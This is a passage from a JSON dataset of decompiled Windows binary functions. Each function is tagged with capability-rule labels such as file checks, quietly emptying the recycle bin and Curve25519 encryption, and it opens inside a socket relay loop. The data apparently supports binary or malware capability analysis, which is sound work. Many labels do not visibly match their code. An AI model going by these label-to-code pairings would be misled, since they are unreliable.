sub.wsock32.dll_recv();\n            if (iVar2 != -1) {\n                fcn.0041b734(0, 0);\n                while( true ) {\n                    fcn.00403af4();\n                    iVar2 = (**(*var_4h + 0xc))();\n                    if (iVar2 < 1) break;\n                    iVar3 = sub.wsock32.dll_send(uVar5, &var_404h, iVar2, 0, iVar1);\n                    if (iVar3 == -1) break;\n                    iVar3 = sub.wsock32.dll_recv(uVar4, &var_404h, 0x400, 0);\n                    if ((iVar3 == -1) || (iVar2 < 1)) break;\n                }\n            }\n        }\n    }\ncode_r0x00489406:\n    sub.wsock32.dll_shutdown(iVar1, 2);\n    sub.wsock32.dll_closesocket(iVar1);\n    fcn.00404650();\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread_1(0);\n}\n",
        "token_count": 745
    },
    "0048c72c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0048c72c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint lpLastWriteTime;\n    uint lpLastAccessTime;\n    uint lpCreationTime;\n    int32_t hObject;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    uStack52 = 0;\n    uStack56 = 0;\n    uStack60 = 3;\n    uStack64 = 0;\n    uStack68 = 1;\n    uStack72 = 0x80000000;\n    uStack76 = 0x48c755;\n    uStack76 = fcn.004059dc();\n    puStack80 = 0x48c75b;\n    iVar2 = sub.kernel32.dll_CreateFileA_1();\n    if (iVar2 == -1) {\n        return var_1h;\n    }\n    uStack84 = 0x48c7d6;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &fcn.0048c72c::var_1h + 1;\n    hObject = iVar2;\n    iVar3 = sub.kernel32.dll_GetFileTime\n                      (iVar2, &fcn.0048c72c::lpCreationTime, &fcn.0048c72c::lpLastAccessTime, \n                       &fcn.0048c72c::lpLastWriteTime);\n    if (iVar3 != 0) {\n        cVar1 = fcn.0048c6ec();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0048c6ec();\n            if (cVar1 != '\\0') {\n                cVar1 = fcn.0048c6ec();\n                if (cVar1 != '\\0') {\n                    var_1h._0_1_ = 1;\n                    goto code_r0x0048c7bc;\n                }\n            }\n        }\n    }\n    var_1h._0_1_ = 0;\ncode_r0x0048c7bc:\n    *in_FS_OFFSET = iVar2;\n    uVar4 = sub.kernel32.dll_CloseHandle_1(hObject, 0x48c7dd);\n    return uVar4;\n}\n",
        "token_count": 624
    },
    "00404418": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint fcn.00404418(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    iVar1 = sub.user32.dll_GetKeyboardType(0);\n    if (iVar1 == 7) {\n        uVar2 = sub.user32.dll_GetKeyboardType(1);\n        if (((uVar2 & 0xff00) == 0xd00) || ((uVar2 & 0xff00) == 0x400)) {\n            uVar3 = 1;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 135
    },
    "00404924": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00404924(uint param_1, uint8_t *param_2)\n\n{\n    uint16_t *puVar1;\n    int32_t *in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint8_t uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    \n    uVar3 = 0;\n    uVar6 = 0;\n    uVar4 = *param_2;\n    piVar2 = in_EAX;\n    do {\n        puVar1 = *(*piVar2 + -0x38);\n        if (puVar1 != NULL) {\n            uVar6 = uVar6 & 0xffff0000 | *puVar1;\n            piVar5 = puVar1 + 3;\n            do {\n                uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                if (*(piVar5 + 6) == uVar4) {\n                    while (((*(uVar3 + 6 + piVar5) ^ param_2[uVar3]) & 0xdf) == 0) {\n                        uVar3 = uVar3 - 1;\n                        if (uVar3 == 0) {\n                            piVar2 = *piVar5 + in_EAX;\n                            goto code_r0x00404970;\n                        }\n                    }\n                    uVar4 = *param_2;\n                    uVar3 = uVar3 & 0xffffff00 | *(piVar5 + 6);\n                }\n                piVar5 = uVar3 + 7 + piVar5;\n                uVar6 = uVar6 - 1;\n            } while (uVar6 != 0);\n        }\n        piVar2 = *(*piVar2 + -0x24);\n    } while (piVar2 != NULL);\ncode_r0x00404970:\n    return CONCAT44(in_EAX, piVar2);\n}\n",
        "token_count": 426
    },
    "00409954": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00409954(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    \n    uVar2 = param_1 ^ 0xffffffff;\n    iVar1 = in_EAX + param_1 + -8;\n    iVar5 = param_2 + param_1 + -8;\n    iVar3 = uVar2 + 9;\n    if (iVar3 == 0 || SCARRY4(uVar2, 9) != iVar3 < 0) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        uVar6 = iVar3 + iVar1 & 3;\n        iVar3 = (uVar2 + 0xd) - uVar6;\n        iVar4 = iVar3;\n        if (iVar3 == 0 || uVar2 + 0xd < uVar6) {\n            do {\n                if (*(iVar4 + iVar1) != *(iVar4 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 4 + iVar1) != *(iVar4 + 4 + iVar5)) {\n                    return 0;\n                }\n                iVar3 = iVar4 + 8;\n                if (iVar3 != 0 && SCARRY4(iVar4, 8) == iVar3 < 0) break;\n                if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n                    return 0;\n                }\n                if (*(iVar4 + 0xc + iVar1) != *(iVar4 + 0xc + iVar5)) {\n                    return 0;\n                }\n                bVar7 = SCARRY4(iVar3, 8);\n                iVar3 = iVar4 + 0x10;\n                iVar4 = iVar3;\n            } while (iVar3 == 0 || bVar7 != iVar3 < 0);\n        }\n    }\n    if (iVar3 < 5) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 4;\n    }\n    if (iVar3 < 7) {\n        if (*(iVar3 + iVar1) != *(iVar3 + iVar5)) {\n            return 0;\n        }\n        iVar3 = iVar3 + 2;\n    }\n    if ((iVar3 < 8) && (*(in_EAX + param_1 + -1) != *(param_2 + param_1 + -1))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 607
    },
    "0042ca24": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h_2\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0042ca24(int32_t *noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6\n            , uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, \n            uint noname_19, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t arg_ch_00;\n    uint32_t uVar2;\n    uint extraout_ECX;\n    uint8_t *puVar3;\n    int32_t unaff_ESI;\n    uint *in_FS_OFFSET;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    int32_t var_4h_2;\n    int32_t var_8h_2;\n    uint var_10h_5;\n    uint var_10h_3;\n    uint var_18h;\n    uint var_1ch_2;\n    uint var_1ch;\n    uint var_10h;\n    uint var_8h;\n    uchar auStack180 [4];\n    int32_t iStack176;\n    uchar *puStack172;\n    int32_t iStack168;\n    uchar *puStack164;\n    uint arg_ch_01;\n    uint arg_10h;\n    uint uStack144;\n    uint uStack140;\n    uchar *puStack136;\n    int32_t iStack132;\n    uint8_t *puStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint *puStack108;\n    uint uStack104;\n    int32_t *piStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint32_t uStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uchar auStack52 [12];\n    uint var_30h_2;\n    uint var_30h;\n    uint uStack24;\n    uchar *puStack20;\n    uchar *puStack16;\n    uint32_t uStack12;\n    uint32_t var_10h_4;\n    uint var_10h_2;\n    \n    puStack108 = &fcn.0042ca24::var_10h_2;\n    uStack12 = var_4h[1];\n    if (uStack12 != 0) {\n        puVar3 = var_4h + 3;\n        uVar2 = uStack12;\n        do {\n            uVar1 = *puVar3;\n            if ((uVar1 & 0x80) == 0) {\n                if (uVar1 == 0xc) {\n                    var_8h_2 = var_8h_2 + 0x10;\n                }\n                else {\n                    if ((uVar1 < 5) || (7 < uVar1)) goto code_r0x0042ca7b;\n                    var_8h_2 = var_8h_2 + 8;\n                }\n            }\n            else {\ncode_r0x0042ca7b:\n                var_8h_2 = var_8h_2 + 4;\n            }\n            puVar3 = puVar3 + 1;\n            uVar2 = uVar2 - 1;\n            unaff_ESI = var_8h_2;\n        } while (uVar2 != 0);\n    }\n    puStack128 = var_4h;\n    puStack20 = &stack0xffffffc0;\n    var_10h_4 = var_4h[2];\n    iStack132 = unaff_ESI;\n    for (uVar2 = var_10h_4; uVar2 != 0; uVar2 = uVar2 - 1) {\n        iStack132 = var_4h_2;\n    }\n    uStack76 = *var_4h;\n    if ((uStack76 == 4) && ((var_10h_4 = var_10h_4 + 1,  var_4h[3] == 9 || (var_4h[3] == 0xd)))) {\n        uStack76 = 8;\n    }\n    puStack16 = &stack0xffffffc0;\n    uStack68 = 0;\n    puStack72 = &stack0xffffffcc;\n    puStack80 = NULL;\n    uStack84 = 0x42cacf;\n    fcn.0042ca14();\n    uStack84 = uStack76;\n    uStack76 = var_10h_5;\n    uStack88 = puStack80;\n    uStack92 = 0x491a44;\n    uStack96 = noname_2;\n    piStack100 = noname_0;\n    uStack104 = 0x42caeb;\n    puStack80 = &stack0xffffffec;\n    arg_ch_00 = (**(*noname_0 + 0x18))();\n    if (arg_ch_00 == 0) {\n        return;\n    }\n    puStack172 = &stack0xffffffcc;\n    uStack104 = CONCAT31(extraout_ECX >> 8, 1);\n    puStack136 = &stack0xffffff94;\n    uStack116 = 0;\n    uStack120 = 0;\n    uStack124 = 0;\n    uStack140 = 0x42c9f9;\n    uStack144 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff70;\n    if (arg_ch_00 == -0x7ffdfff7) {\n        puStack136 = &stack0xffffff94;\n        puStack108 = &fcn.0042ca24::var_10h_2;\n        fcn.004057d4();\n        arg_10h = uStack116;\n        fcn.004057d4();\n        puStack164 = 0x42c98c;\n        arg_ch_01 = uStack120;\n        fcn.004057d4();\n        puStack164 = 0x42c99b;\n        iStack168 = fcn.0042bccc(var_30h, arg_ch_01, arg_10h, uStack24);\n        if (piStack100 != '\\0') {\n            puStack164 = 0x42c9b0;\n            fcn.004061e4();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack168 = fcn.0042bbf8(0, arg_ch_00);\n    }\n    if (var_ch != 0) {\n        iStack176 = iStack168;\n        if (iStack168 == 0) {\n            iStack176 = fcn.00405470();\n        }\n        puStack164 = &stack0xffffffc0;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x495014)(0xeedfade, 1, 7, &stack0xffffff4c);\n        return;\n    }\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_10h;\n    uStack144 = 0x42ca00;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1684
    },
    "00471380": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.00471380(void)\n\n{\n    uint in_EAX;\n    \n    fcn.00405584();\n    // switch table (8 cases) at 0x4713a2\n    switch(in_EAX) {\n    case 1:\n        fcn.00405584();\n        return;\n    case 2:\n        fcn.00405584();\n        return;\n    case 3:\n        fcn.00405584();\n        return;\n    case 4:\n        fcn.00405584();\n        return;\n    case 5:\n        fcn.00405584();\n        return;\n    case 6:\n        fcn.00405584();\n        break;\n    case 7:\n        fcn.00405584();\n        return;\n    }\n    return;\n}\n",
        "token_count": 168
    },
    "004100b0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004100b0(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41010a;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.00409f30();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410111;\n    uStack20 = 0x410109;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 192
    },
    "0041011c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041011c(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x410176;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040b7c4();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41017d;\n    uStack20 = 0x410175;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 194
    },
    "00410188": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410188(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4101e2;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040b798();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4101e9;\n    uStack20 = 0x4101e1;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 196
    },
    "004101f4": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004101f4(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41024e;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040d24c();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x410255;\n    uStack20 = 0x41024d;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 194
    },
    "00410260": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410260(uint arg_8h, int32_t arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x4102ba;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (arg_ch == 0x400) {\n        fcn.004057d4();\n        fcn.0040b7f0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x4102c1;\n    uStack20 = 0x4102b9;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 197
    },
    "00411f60": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.00411f60(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack28 = 0x412003;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    fcn.00415164();\n    uVar3 = var_4h;\n    iVar2 = (***0x494cc4)(var_4h, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.004057d4();\n        cVar1 = fcn.00409f30();\n        if (cVar1 == '\\0') {\n            var_8h = fcn.004131c0();\n            var_8h = var_8h & 0x7f;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.00411298();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x41200a);\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 330
    },
    "00412964": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nuint64_t fcn.00412964(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    uint uStack44;\n    uint uStack40;\n    int32_t iStack36;\n    uchar *puStack32;\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    puStack32 = &stack0xffffffec;\n    iStack36 = 0x412974;\n    sub.oleaut32.dll_VariantInit();\n    iStack36 = 3;\n    uStack40 = 0;\n    uStack44 = 0x400;\n    iVar1 = (***0x494be0)(&stack0xffffffe8);\n    if (iVar1 == 0) {\n        uVar3 = iStack36;\n    }\n    else {\n        iVar1 = (***0x494be0)(&stack0xffffffd4);\n        if (iVar1 == 0) {\n            uVar3 = fcn.00403450();\n        }\n        else if (iVar1 == -0x7ffdfffb) {\n            uVar2 = fcn.004131c0();\n            uVar3 = uVar2 & 0x7f;\n        }\n        else {\n            fcn.00411298();\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 301
    },
    "00412a10": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412a10(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack52 = 0x412afe;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    fcn.00415164();\n    fcn.004057d4();\n    cVar1 = fcn.00409f50();\n    if (cVar1 == '\\0') {\n        iVar2 = (***0x494cc4)(var_4h, 0x400, 0, &fcn.00412a10::var_14h);\n        if (iVar2 == 0) {\n            _var_10h = var_14h;\n        }\n        else {\n            iVar2 = (***0x494ab8)(var_4h, 0x400, 0, &fcn.00412a10::var_20h);\n            if (iVar2 == 0) {\n                _var_10h = fcn.00403450();\n            }\n            else if (iVar2 == -0x7ffdfffb) {\n                uVar3 = fcn.004131c0();\n                _var_10h = uVar3 & 0x7f;\n            }\n            else {\n                fcn.00411298();\n                _var_10h = 0;\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x412b05;\n    uStack52 = 0x412af5;\n    fcn.00405530();\n    uStack52 = 0x412afd;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 477
    },
    "004169c0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004169c0(float arg_8h, float arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_EAX;\n    uint8_t *puVar2;\n    int32_t in_EDX;\n    double *pdVar3;\n    code *var_8h;\n    uint var_4h;\n    \n    var_8h = *(in_EDX + 8);\n    puVar2 = fcn.004164e8();\n    uVar1 = *puVar2;\n    if ((var_8h & 0xff000000) == 0xff000000) {\n        pdVar3 = (var_8h & 0xffffff) + in_EAX;\n    // switch table (5 cases) at 0x416a09\n        switch(uVar1 & 0x7f) {\n        case 0:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 1:\n            *pdVar3 = CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h));\n            break;\n        case 2:\n            *pdVar3 = arg_8h;\n            *(pdVar3 + 4) = arg_ch;\n            *(pdVar3 + 1) = arg_10h;\n            break;\n        case 3:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n            break;\n        case 4:\n            *pdVar3 = ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416bb4);\n        }\n    }\n    else {\n        if ((var_8h & 0xff000000) == 0xfe000000) {\n            var_8h = *(*in_EAX + var_8h);\n        }\n        if (*(in_EDX + 0x10) == -0x80000000) {\n    // switch table (5 cases) at 0x416aa5\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416bb4));\n            }\n        }\n        else {\n    // switch table (5 cases) at 0x416b38\n            switch(uVar1 & 0x7f) {\n            case 0:\n                (*var_8h)();\n                break;\n            case 1:\n                (*var_8h)(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)));\n                break;\n            case 2:\n                (*var_8h)(arg_8h, arg_ch, arg_10h);\n                break;\n            case 3:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h))));\n                break;\n            case 4:\n                (*var_8h)(ROUND(CONCAT28(arg_10h, CONCAT44(arg_ch, arg_8h)) * *0x416bb4));\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 814
    },
    "0041bb60": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0041bb60(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040a21c(arg_8h, arg_ch);\n    return uVar1;\n}\n",
        "token_count": 71
    },
    "0041db44": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041db44(uint param_1)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041ebc0(param_1);\n    // switch table (14 cases) at 0x41db7a\n    switch(uVar1 & 0x7f) {\n    case 0:\n        fcn.00405584();\n        break;\n    default:\n        fcn.0041ca68();\n        break;\n    case 7:\n        fcn.0041d058();\n        fcn.00405620();\n        fcn.00405a3c();\n        fcn.0041d058();\n        break;\n    case 8:\n        fcn.00405584();\n        break;\n    case 9:\n        fcn.00405584();\n        break;\n    case 0xd:\n        fcn.00405584();\n    }\n    return;\n}\n",
        "token_count": 200
    },
    "0041ecd0": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041ecd0(void)\n\n{\n    uint32_t uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack20 = 0x41ee75;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    uVar1 = fcn.0041ebc0();\n    // switch table (22 cases) at 0x41ed07\n    switch(uVar1 & 0x7f) {\n    case 1:\n        fcn.0041ec1c(&stack0xfffffffc);\n        break;\n    case 2:\n        fcn.0041f0dc();\n        break;\n    case 3:\n        fcn.0041f0dc();\n        break;\n    case 4:\n        fcn.0041f0dc();\n        break;\n    case 5:\n        fcn.0041f0dc();\n        break;\n    case 6:\n    case 7:\n        fcn.0041e9e4();\n        break;\n    case 10:\n        fcn.0041ec44(&stack0xfffffffc);\n        break;\n    case 0xb:\n        fcn.0041ebd4();\n        break;\n    case 0xc:\n        fcn.0041ec44(&stack0xfffffffc);\n        break;\n    case 0xe:\n        fcn.0041ec74(&stack0xfffffffc);\n        break;\n    case 0xf:\n        fcn.0041f0dc();\n        break;\n    case 0x10:\n        fcn.0041f0dc();\n        break;\n    case 0x11:\n        fcn.0041f0dc();\n        break;\n    case 0x12:\n        fcn.0041ec44(&stack0xfffffffc);\n        break;\n    case 0x13:\n        fcn.0041f0dc();\n        break;\n    case 0x14:\n        fcn.0041ec44(&stack0xfffffffc);\n        break;\n    case 0x15:\n        fcn.0041f0dc();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41ee7c;\n    uStack20 = 0x41ee74;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 558
    },
    "0041f2ec": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0041f2ec(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    ulong uVar3;\n    uint in_stack_ffffffc8;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41f4fe;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.0041163c();\n    uVar2 = fcn.0041d034();\n    // switch table (22 cases) at 0x41f32e\n    switch(uVar2 & 0x7f) {\n    case 0:\n    case 0xd:\n        cVar1 = fcn.0041ebc0();\n        if (cVar1 != '\\r') {\n            fcn.00416324();\n        }\n        break;\n    default:\n        fcn.0040dbb8();\n        fcn.00404ec4();\n        break;\n    case 2:\n        fcn.0041dc40();\n        fcn.004158a8();\n        break;\n    case 3:\n        fcn.0041dc40();\n        fcn.004158a8();\n        break;\n    case 4:\n        fcn.0041dc40();\n        fcn.004158a8();\n        break;\n    case 5:\n        fcn.0041d9f0();\n        fcn.00415aa0();\n        break;\n    case 6:\n    case 0xc:\n        fcn.0041ea20();\n        fcn.00415adc();\n        break;\n    case 8:\n    case 9:\n        fcn.0041ebc0();\n        fcn.00415a78();\n        break;\n    case 10:\n        in_stack_ffffffc8 = 0x41f4a1;\n        fcn.0041f124(&stack0xfffffffc);\n        fcn.00411a68();\n        break;\n    case 0xf:\n        fcn.0041da6c();\n        fcn.00415aa0();\n        break;\n    case 0x10:\n        fcn.0041dab0();\n        fcn.00415ac8();\n        break;\n    case 0x11:\n        fcn.0041db00();\n        fcn.00415ab4();\n        break;\n    case 0x12:\n    case 0x14:\n        fcn.0041eadc();\n        fcn.00415b08();\n        break;\n    case 0x13:\n        uVar3 = fcn.0041dcac();\n        in_stack_ffffffc8 = uVar3;\n        fcn.004159a4(in_stack_ffffffc8, uVar3 >> 0x20);\n        break;\n    case 0x15:\n        fcn.0041da28();\n        fcn.00415aa0();\n    }\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x41f505;\n    fcn.00411650();\n    fcn.00405d28();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 745
    },
    "0043235c": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid fcn.0043235c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    do {\n        iVar1 = *(in_EAX + 8 + (uVar2 & 0x7f) * 4);\n        if (iVar1 != 0) {\n            (***0x494a54)(iVar1);\n            *(in_EAX + 8 + (uVar2 & 0x7f) * 4) = 0;\n        }\n        uVar2 = uVar2 + 1;\n    } while (uVar2 != '\\x18');\n    return;\n}\n",
        "token_count": 154
    },
    "00432498": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
